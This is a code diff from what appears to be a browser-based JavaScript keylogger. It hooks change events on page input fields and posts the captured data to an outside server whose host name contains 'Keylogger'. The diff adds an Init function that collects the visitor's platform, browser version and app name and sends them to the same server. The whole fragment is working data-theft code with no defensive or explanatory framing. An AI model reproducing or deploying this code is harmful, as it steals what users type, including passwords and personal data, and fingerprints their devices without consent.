@@ -19,16 +19,38 @@
           (e.target.onchange = (e) => [SendData(data)]),
         ];
     });      
-
       
-    });
+  });
 })();
 
 function SendData(data) {
   fetch("https://Keylogger.pzcuong2410.repl.co/send", {
     method: "POST",
-    headers: { "Content-Type": "application/json" },
+    headers: { 
+      "Content-Type": "application/json",
+      "Access-Control-Allow-Origin": "*",
+    },
     body: JSON.stringify(data),
+  })
+    .then((resp) => resp.json())
+    .then((data) => console.log("success", data));
+}
+
+function Init() {
+  let os_data = {};
+  os_data.osName = navigator.platform;
+  os_data.osInfo = navigator.appVersion;
+  os_data.appName = navigator.appName;
+
+  fetch("https://Keylogger.pzcuong2410.repl.co/init", {
+    method: "POST",
+    headers: { 
+      "Content-Type": "application/json",
+      "os_data": JSON.stringify(os_data)
+    },
+    body: JSON.stringify({
+      "message": "Init device"
+    }),
   })
     .then((resp) => resp.json())
     .then((data) => console.log("success", data));
